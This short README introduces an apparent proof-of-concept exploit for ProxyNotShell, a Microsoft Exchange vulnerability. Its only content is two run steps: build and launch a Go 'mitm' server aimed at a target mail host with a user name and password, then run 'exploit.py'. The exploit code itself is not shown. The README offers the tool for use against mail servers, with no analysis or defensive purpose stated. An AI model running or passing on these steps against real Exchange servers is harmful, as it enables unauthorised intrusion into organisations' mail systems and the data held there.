# proxynotshell
[PoC] ProxyNotShell

# 1. Run mitm server
```
go build && ./mitm -target https://mail.domain.corp -user 'user@domain.corp' -pass 'passwd'
```

2. Run wsman
```
python3 exploit.py
```
